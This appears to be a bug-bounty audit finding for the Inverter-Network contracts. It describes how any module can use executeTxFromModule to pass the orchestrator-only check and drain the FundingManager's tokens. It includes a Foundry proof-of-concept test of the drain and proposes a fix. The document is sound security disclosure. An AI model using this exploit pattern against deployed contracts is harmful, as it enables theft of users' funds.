# [H] Any module can drain the  `FundingManager` of all funding tokens

## Summary
Severity: High
Chain: Smart contract
Component: Inverter-Network
Published: 2024-06-06
Source: https://github.com/hats-finance/Inverter-Network-0xe47e52c4fea05e555920f1dcdcc6fb8eca103eeb/issues/50
Type: hats-finding

## Details
**Github username:** @0xfuje
**Twitter username:** 0xfuje
**Submission hash (on-chain):** 0x27f9021e3e442d34e67a69b9a37ea9c2ced9687f68e4db5a719b6b3b148e9eae
**Severity:** high

**Description:**
## Impact
Massive loss of user / orchestrator funds: attacker can transfer every `FundingManager` orchestrator token to themselves

## Description
This vulnerability arises with a combination of two weaknesses of the system.

### 1. Every module has the same permission to call as the orchestrator owner
The `Orchestrator_v1` contract inherits `ModuleManagerBase_v1`. The owner of the orchestrator contract has the power to make any calls to any contracts via the `executeTx` function.

`Orchestrator_v1` - `executeTx()`
```solidity
    function executeTx(address target, bytes memory data)
        external
        onlyOrchestratorOwner
        returns (bytes memory)
    {
        bool ok;
        bytes memory returnData;
        (ok, returnData) = target.call(data);

        if (ok) {
            return returnData;
        } else {
            revert Orchestrator__ExecuteTxFailed();
        }
    }
```
However, any module has the same permissions as well via using `executeTxFromModule()`, which should not be the case. This means that any module can pose as the orchestrator address as the `msg.sender`.

`ModuleManagerBase_v1` - `executeTxFromModule()`
```solidity
    function executeTxFromModule(
        address to,
        bytes memory data
    ) external virtual onlyModule returns (bool, bytes memory) {
        bool ok;
        bytes memory returnData;

        (ok, returnData) = to.call(data);

        return (ok, returnData);
    }
```

### 2. onlyOrchestrator in `fundingManager` uses vulnerable access control
Usually `onlyOrchestratorOwner()` access control is used by contracts, which checks if the `msg.sender` has the owner role in the authorizer contract. However the inherited `onlyOrchestrator()` of funding manager only checks if the `msg.sender` is the orchestrator.

`Module_v1` - `onlyOrchestrator()` -> `_onlyOrchestratorModifier()`
```solidity
    function _onlyOrchestratorModifier() internal view {
        if (_msgSender() != address(__Module_orchestrator)) {
            revert Module__OnlyCallableByOrchestrator();
        }
    }
```
### The Exploit
The only function that uses the `onlyOrchestrator()` modifier is the funding manager contract's `transferOrchestratorToken()` function. Any module can exploit this and via calling `executeTxFromModule()` -> `fundingManager.transferOchestratorToken()` because the transaction will come from the orchestrator address, therefore bypass the access control.


## Proof of Concept
1. navigate to `test/modules/fundingManager/rebasing/FM_Rebasing_v1.t.sol`
2. copy and paste the below proof of concept
3. run `forge test --match-test testUnauthorizedTransfer -vvvv`
```solidity
    function testUnauthorizedTransfer() public {
        address haxor = vm.addr(420);
        _token.mint(address(fundingManager), 100_000);

        assertEq(_token.balanceOf(haxor), 0);

        // any random module works, for ease of use we make use of an existing one
        vm.prank(address(_authorizer));
        _orchestrator.executeTxFromModule(
            address(fundingManager),
            abi.encodeWithSelector(
                IFundingManager_v1.transferOrchestratorToken.selector,
                haxor,
                100_000
            )
        );

        assertEq(_token.balanceOf(haxor), 100_000);
    }
```

## Recommendation
Consider to use the `onlyOrchestratorOwner()` modifier on `transferOrchestratorToken()` and to delete `onlyOrchestrator()` to avoid similar vulnerabilities in the future. I will provide additional recommendation in comments about the use of `executeTxFromModule()`.
